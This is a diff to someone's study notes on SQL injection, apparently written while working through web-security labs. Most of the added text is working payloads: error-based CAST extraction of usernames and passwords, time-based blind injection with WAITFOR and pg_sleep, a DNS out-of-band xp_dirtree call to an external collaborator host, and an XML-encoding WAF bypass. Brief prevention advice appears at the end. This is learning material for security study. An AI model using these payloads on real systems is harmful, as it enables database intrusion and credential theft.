@@ -142,6 +142,84 @@ ofc this will take to long to do
 thus we write ask gpt to ask make a script
 see "sql_error_test.py"
 
+
+verbose erroring
+sometimes a usefull error is returned like syntax error ' on line...
+trying with a cast we could maybe get useful data out oof it
+CAST((SELECT example_column FROM example_table) AS int)
+
+'
+this gave an error
+'--
+fixed the error
+' AND CAST((SELECT 1) AS int)--
+another error
+' AND 1=CAST((SELECT 1) AS int)--
+fixed the previous error
+now inserting our generic select
+' AND 1=CAST((SELECT username FROM users) AS int)--
+we got an error that showed our query being cut of so removing the part of the original cookie fixed this
+' AND 1=CAST((SELECT username FROM users) AS int)--
+errorr says to much rows
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+errorr now says the first username
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+and just changing to get the password retrieves us the credentials
+
+## time based sql
+basicaly the sql executes but doesnt return anything different
+but we could try to insert a delay based on if something is true
+as the webapps are executed synchronously we could manipulate this
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+'%3BSELECT+CASE+WHEN+(YOUR-CONDITION-HERE)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+first testing the different responses
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+then getting a username from a table
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+then getting its password length
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>50)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+and then getting bruteforcing the password
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+ofc this is tedious and we let our buddy gpt
+write a script for it "sql_timed_test.py"
+
+## out-of-band (OAST) technique
+if a different thread is used to execute the query
+then we could try to get info by performing a network query to a server we control
+
+most time dns could be used to extract data bcs dns most times doesnt get blocked bcs its essential for normal operations
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+
+sometimes not only a string is used
+but it could be hidden in xml or json
+
+fe xml
+1+1
+1 UNION SELECT username || '~' || password FROM users
+got us detected by a waf
+<@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>
+abusing a feature of xml
+gets us bypassing it
+
+## stored sql
+is saving the sql input somewhere for later use
+then later gets abused
+
+## how to prevent
+use prepared statements,
+parameter based querys,
+instead of string concatenations,
+prohibit a list of words that can exist in fields
+
+
 ## payloads
 
 stored in the root folder: payloads_sql.lst
+
+https://portswigger.net/web-security/sql-injection/cheat-sheet
